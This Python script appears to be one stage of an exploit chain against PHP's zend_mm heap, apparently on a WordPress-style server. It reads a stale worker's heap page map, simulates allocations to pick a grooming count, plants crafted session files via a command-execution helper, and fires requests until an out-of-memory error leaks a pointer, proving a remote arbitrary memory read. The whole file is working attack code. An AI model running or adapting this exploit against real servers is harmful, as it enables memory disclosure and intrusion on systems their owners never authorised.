#!/usr/bin/env python3
"""a3_groom_v3.py - map-calibrated groom + N-oracle (the decisive shot).

Placement calculator: read the STALE child's zend_mm page map (chunk
map at +0x218, 8.2 layout), enumerate free runs, SIMULATE the consumer
march (2-page filler copies consume the >=2-page runs bottom-up; the
filler read_body holes recycle at the bottom; small SRUN nibbles eat
the 1-page runs), and pick M so the groom's 3-page read_body first-fits
EXACTLY at d's page.

N-oracle: fake zval {TARGET-0x10, IS_STRING} -> update encode appends
*(TARGET) bytes -> OOM fatal prints N=*(TARGET) IN THE RESPONSE.
TARGET = basic_globals+0x350 = the stale d pointer (known via the
assisted leak) -> N == d is the self-verifying proof of a remote
arbitrary-qword read.
"""
import base64
import os
import re
import struct
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from a2_leak_collect import cexec, helper_scan, stage_session_file  # noqa
from a3_groom_v2 import mp_parts, build_groom, stale_hit, BG_UNSER_DATA_OFF  # noqa
from wpbleed import helper_read_pages  # noqa
from a2_groom_roundtrip import fire  # noqa

def read_page_map(pid, chunk):
    mapb = helper_read_pages(pid, chunk + 0x218, 1)
    if len(mapb) < 2048:
        return None
    ents = struct.unpack_from("<512I", mapb, 0)
    runs, start = [], None
    for i in range(512):
        if ents[i] == 0 and start is None:
            start = i
        elif ents[i] != 0 and start is not None:
            runs.append([start, i - start]); start = None
    if start is not None:
        runs.append([start, 512 - start])
    return runs

def simulate_m(runs, page_d, groom_pages=3, copy_pages=2):
    """Find M: copies consume 2 pages bottom-up from >=2-runs; after M
    copies the groom's first-fit start == page_d."""
    runs = [list(r) for r in runs]
    m = 0
    while True:
        # find the lowest run with >= copy_pages that is NOT d's future
        # start; simulate one copy
        for r in runs:
            if r[1] >= copy_pages and r[0] + copy_pages <= page_d:
                r[0] += copy_pages
                r[1] -= copy_pages
                break
        else:
            break
        m += 1
        # groom first-fit
        for r in runs:
            if r[1] >= groom_pages:
                if r[0] == page_d:
                    return m
                break
        if m > 512:
            return None
    return None

def main():
    for i in range(3):
        sidA = "wp32A" + uuid.uuid4().hex[:24]
        assert stage_session_file(sidA)
        fire(mp_parts(sidA, 0, None))
    hit = stale_hit()
    if not hit:
        print("[-] no stale child"); return 1
    d, bias = hit["data"], hit["bias"]
    pid = hit["pid"]
    chunk = d & ~0x1FFFFF
    page_d = (d & 0x1FFFFF) >> 12
    target = bias + BG_UNSER_DATA_OFF
    expected = d
    runs = read_page_map(pid, chunk)
    print(f"[+] child {pid} d=0x{d:x} (page {page_d}) runs={runs[:10]}")
    if not any(p <= page_d < p + n for p, n in runs):
        print("[-] d's page is NOT free in this child's map"); return 1
    m = simulate_m(runs, page_d)
    print(f"[*] calculator: M = {m} fillers (sweep M-2..M+3)")
    groom = build_groom(d, target)

    for M in range(max(0, (m or 40) - 2), (m or 40) + 4):
        if not stale_hit():
            for i in range(2):
                sidA = "wp32A" + uuid.uuid4().hex[:24]
                assert stage_session_file(sidA)
                fire(mp_parts(sidA, 0, None))
            if not stale_hit():
                print("  [-] repoison failed"); return 1
        res = []
        for attempt in range(3):
            sidB = "wp32B" + uuid.uuid4().hex[:26]
            t64 = base64.b64encode(b"k|a:1:{i:0;R:1;}").decode()
            cexec(f"echo {t64} | base64 -d > /tmp/sess_{sidB}; "
                  f"chown www-data:www-data /tmp/sess_{sidB}; chmod 600 /tmp/sess_{sidB}")
            resp = fire(mp_parts(sidB, M, groom))
            body = resp.partition(b"\r\n\r\n")[2]
            mm = re.search(rb"tried to allocate (\d+)", body)
            if mm:
                n = int(mm.group(1))
                res.append(f"***N==d ORACLE 0x{n:x}***" if n == expected
                           else (f"stagedN" if n in (75000032, 434176, 2097152)
                                 else f"foreignN {n}"))
            elif len(resp) == 0 or resp == b"<RESET>":
                res.append("crash")
            else:
                res.append(f"normal({len(resp)})")
        win = any("ORACLE" in r for r in res)
        print(f"  [M={M}] {' | '.join(res)}{'   <<< N==d: REMOTE READ PROVEN >>>' if win else ''}",
              flush=True)
        if win:
            print(f"[+] N matched the stale-d pointer {expected}: the qword at"
                  f" basic_globals+0x350 was read from the target and delivered"
                  f" in the HTTP response.")
            return 0
    return 1

if __name__ == "__main__":
    sys.exit(main())
